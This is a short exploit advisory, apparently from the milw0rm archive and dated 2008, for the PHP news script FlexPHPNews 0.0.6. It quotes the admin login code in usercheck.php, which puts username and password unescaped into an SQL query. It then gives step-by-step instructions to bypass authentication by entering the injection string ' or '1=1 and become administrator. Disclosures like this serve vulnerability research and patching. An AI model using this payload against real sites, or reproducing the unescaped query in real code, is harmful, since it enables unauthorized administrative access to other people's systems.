@@ -1,0 +1,41 @@
+[START]
+
+#########################################################################################
+[0x01] Informations:
+
+Script         : FlexPHPNews PRO 0.0.6
+Script	       : FlexPHPNews 0.0.6
+Download       : http://www.hotscripts.com/jump.php?listing_id=24219&jump_type=1  [0.0.6 Pro]
+Download       : http://www.hotscripts.com/jump.php?listing_id=22130&jump_type=1  [0.0.6]
+Vulnerability  : Sql Injection (Auth bypass)
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Notes          : Proud to be Italian
+Greets:        : XaDoS, x0r, emgent, Jay, str0ke
+
+#########################################################################################
+[0x02] Bug:[Sql Injection (Auth bypass)]
+######
+
+Bugged file is: /[path]/admin/usercheck.php
+
+[CODE]
+
+if (!empty($logincheck)){
+$sql = "select username,adminid from newsadmin where username='$checkuser' and password='$checkpass'";
+$results = $db->select($sql);
+
+[/CODE]
+
+
+[!] EXPLOIT DETAILS:
+
+ [1] Go to /[path]/admin/index.php
+ [2] Put as username and password the following sql code: ' or '1=1
+ [3] You are the admin now, bypass succesfull =)
+
+#########################################################################################
+
+[/END]
+
+# milw0rm.com [2008-12-14]
